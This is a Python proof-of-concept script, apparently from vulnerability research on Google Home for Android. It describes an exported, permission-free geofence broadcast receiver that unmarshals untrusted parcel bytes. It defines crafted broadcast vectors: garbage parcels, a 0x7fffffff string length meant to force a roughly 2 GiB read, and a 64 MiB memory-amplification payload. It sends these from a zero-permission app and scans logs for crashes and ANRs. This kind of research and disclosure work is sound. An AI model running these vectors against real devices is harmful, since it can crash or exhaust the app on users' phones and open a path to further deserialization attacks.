#!/usr/bin/env python3
"""
Batch 5 — Google Home GeofenceTransitionBroadcastReceiver.

Manifest: exported=true, NO android:permission, NO readPermission/writePermission.
onReceive() (smali):
  - performs NO Binder.getCallingUid() check, NO signature check, NO permission check
  - getSerializableExtra("com.google.android.location.intent.extra.geofence_list") -> ArrayList
  - for each element: check-cast [B  -> Parcel.unmarshall(bytes,0,len)   [zero validation]
                       -> ParcelableGeofence.CREATOR.createFromParcel(parcel)
  - getParcelableExtra("...triggering_location") -> Location
  - protobuf is built from attacker data and dispatched to the presence repository

These vectors prove (a) delivery from a zero-permission app and (b) that attacker bytes
reach the parcel/protobuf sink inside Google Home's own process.
"""
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import capture as C

CH = "com.google.android.apps.chromecast.app"
RCV = CH + "/com.google.android.apps.chromecast.app.gf.repository.GeofenceTransitionBroadcastReceiver"
T = "com.google.android.location.intent.extra.transition"
GFL = "com.google.android.location.intent.extra.geofence_list"
LOC = "com.google.android.location.intent.extra.triggering_location"


def bc(gfl, transition=1, loc=True, explicit=True, err=0):
    e = {"gms_error_code": err, T: transition, GFL: gfl}
    if loc:
        e[LOC] = {"location": {"lat": 12.9716, "lng": 77.5946, "accuracy": 5, "provider": "gps"}}
    cmd = {"type": "broadcast", "action": "com.google.android.apps.chromecast.app.gf.GF_TRANSITION",
           "extras": e, "label": "geo"}
    if explicit:
        cmd["component"] = RCV
    return cmd


VECTORS = [
    ("geo_v_string_id", bc(["attacker-controlled-geofence-id"])),
    ("geo_v_garbage4", bc([{"bytesHex": "ffffffff"}])),
    ("geo_v_garbage64", bc([{"bytesHex": "ffffffff" * 16}])),
    # parcel string length = 0x7fffffff -> readString() tries to read ~2 GiB
    ("geo_v_huge_len", bc([{"bytesHex": "ffffffff7fffffff"}])),
    # memory amplification: single 64 MiB element
    ("geo_v_amp64m", bc([{"bytesLen": 67108864}])),
]


def analyse(label):
    p = os.path.join(C.EVID, f"{label}.full.txt")
    log = open(p).read()
    crash = [l for l in log.splitlines()
             if "FATAL EXCEPTION" in l or "AndroidRuntime: Process:" in l
             or "Force finishing activity" in l or "has died" in l]
    handled = [l for l in log.splitlines() if "Handling geofence transition" in l]
    sec = [l for l in log.splitlines() if "SecurityException" in l or "Permission Denial" in l]
    anr = [l for l in log.splitlines() if "ANR in" in l or "not responding" in l]
    return crash, handled, sec, anr


if __name__ == "__main__":
    for label, cmd in VECTORS:
        C.capture(label, cmd, [CH], settle=4, fg=False)
        crash, handled, sec, anr = analyse(label)
        print(f"{label:16} crash={len(crash):2} handled={len(handled):2} "
              f"secdeny={len(sec):2} anr={len(anr):2}")
        for l in crash[:6]:
            print("      !! " + l[:260])
        for l in handled[:2]:
            print("      >> " + l[:260])